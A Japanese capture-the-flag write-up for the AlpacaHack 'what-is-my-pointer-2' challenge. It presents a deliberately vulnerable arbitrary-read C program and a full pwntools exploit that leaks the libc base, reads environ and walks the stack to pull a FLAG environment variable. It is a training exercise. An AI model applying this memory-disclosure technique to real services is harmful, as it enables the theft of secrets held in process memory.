# ■ what-is-my-pointer-2
[what is my pointer 2 - AlpacaHack](https://alpacahack.com/daily/challenges/what-is-my-pointer-2)

## 1. Writeup
### 1.0. 事前情報
`chal.c`:
```C
 1	// gcc chal.c -o chal
...
 8	int main(void) {
 9	    printf("printf @ %p\n",printf);
10	    while(1) {
11	        printf("input the pointer where you wanna read:");
12	        unsigned long ptr;
13	        scanf("%lx%*c",&ptr);
14	        printf("%lx\n",*(unsigned long *)ptr);
15	    }
16	}
...
```

- 
- `printf`のメモリ上に配置されたアドレス(関数ポインタ)が提示される.
- 指定したポインタの値を4 byteの16進数で出力する.

`Dockerfile`:
```Dockerfile
...
17	service pwn
18	{
19	  type           = UNLISTED
20	  disable        = no
21	  socket_type    = stream
22	  protocol       = tcp
23	  wait           = no
24	  user           = pwn
25	  bind           = 0.0.0.0
26	  port           = 1337
27	  env            = FLAG=$(cat /tmp/flag.txt)
28	  server         = /usr/bin/timeout
29	  server_args    = 180 /home/pwn/chal
30	}
31	EOF
...
```

- 環境変数`FLAG`に`flag.txt`の内容が格納されている.

### 1.1. 方針

`chal.c`を通じて環境変数`FLAG`の値を確認する.

1. `printf`のメモリ上アドレスからlibcベースアドレスをリーク
2. libc内のenviron(環境変数配列へのポインタ)からスタックアドレスを取得
3. 環境変数配列内を走査して`FLAG`を確認する.

#### 1.1.1. libcベースアドレスのリーク

```
libc_base = printf_addr - PRINTF_OFFSET
```

- `libc_base`: メモリ上の`libc`ベースアドレス
- `printf_addr`: メモリ上の`printf`アドレス
- `PRINTF_OFFSET`: libc内の`printf`のoffset

問題環境内から`libc.so.6`を取得する.

```bash
root@6f85eadef47c:/home/pwn# ls
chal
root@6f85eadef47c:/home/pwn# ldd chal
        linux-vdso.so.1 (0x00007947c342a000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007947c3209000)
        /lib64/ld-linux-x86-64.so.2 (0x00007947c342c000)
...
$ docker cp 6f85eadef47c:/lib/x86_64-linux-gnu/libc.so.6 ./
```

`readelf`で`printf`のoffsetを確認する.

```
$ readelf -s ./libc.so.6 | grep -e "\sprintf"
  2611: 0000000000060100   204 FUNC    GLOBAL DEFAULT   17 printf@@GLIBC_2.2.5
```

`PRINTF_OFFSET=0x60100` とわかる.

#### 1.1.2. envirionへのポインタアドレスの取得

```
environ_ptr_addr = libc_base + ENVIRON_OFFSET
```

libcベースアドレスがリークできているので, メモリ上の`environ`アドレスを得る.

```bash
$ readelf -s ./libc.so.6 | grep -e "\senviron"
   295: 000000000020ad58     8 OBJECT  WEAK   DEFAULT   32 environ@@GLIBC_2.2.5
```

`ENVIRON_OFFSET=0x20ad58` とわかる.

#### 1.1.3. `FLAG`を確認
環境変数配列内を走査して`FLAG`を確認する. そのまま.

### 1.2. exploit

`solve.py`
```python
 1	from pwn import *
 2	
 3	context.binary = ELF('./chal')
 4	
 5	_, HOST, PORT = 'nc localhost 1337'.split()
 6	_, HOST, PORT = 'nc 34.170.146.252 31402'.split()
 7	io = remote(HOST, PORT)
 8	
 9	elf = ELF('./chal')
10	libc = ELF('./libc.so.6')
11	# PRINTF_OFFSET = 0x60100
12	# ENVRION_OFFSET = 0x20ad58
13	
14	def read(addr):
15		io.sendlineafter(b'read:', hex(addr).encode())
16		line = io.recvline().strip()
17		return int(line, 16)
18	
19	io.recvuntil(b'printf @ ')
20	printf_addr = int(io.recvline().strip(), 16)
21	libc.address = printf_addr - libc.symbols['printf']
22	# libc_base = printf_addr - PRINTF_OFFSET
23	print('libc_base: ', hex(libc.address))
24	
25	environ_ptr_addr = libc.symbols['environ']
26	# environ_ptr_addr = libc_base + ENVRION_OFFSET
27	print('environ: ', hex(environ_ptr_addr))
28	stack_addr = read(environ_ptr_addr)
29	print('stack_base: ', hex(stack_addr))
30	
31	# Traverse the stack to find the pointer to the FLAG.
32	i = 0
33	flag_addr = None
34	while True:
35		ptr = read(stack_addr + i*8)
36		data = read(ptr)
37		str = data.to_bytes(8, 'little')
38		print(str.decode())
39		if str.startswith(b'FLAG='):
40			flag_addr = ptr
41			break
42		i += 1
43	
44	# Read the FLAG string 8 bytes at a time and concatenate them.
45	flag = b''
46	addr = flag_addr
47	while b'}' not in flag:
48		data = read(addr)
49		flag += data.to_bytes(8, 'little')
50		addr += 8
51	
52	print(flag.decode())
```

`Pwntools`を利用して, `PRINTF_OFFSET`の確認や`environ_ptr_addr`(`stack_addr`)の計算を簡略化できる.

出力例:
```bash
$ python solve.py
[*] '/home/user/alpacahack/what-is-my-pointer-2/chal'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
[+] Opening connection to localhost on port 1337: Done
[*] '/home/user/alpacahack/what-is-my-pointer-2/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    FORTIFY:    Enabled
    SHSTK:      Enabled
    IBT:        Enabled
libc_base:  0x7fae67fbc000
environ:  0x7fae681c6d58
stack_base:  0x7ffcc8b7e5d8
PATH=/us
HOSTNAME
HOME=/ro
FLAG=Alp
FLAG=Alpaca{REDACTED}\x00RE
[*] Closed connection to localhost port 1337
```
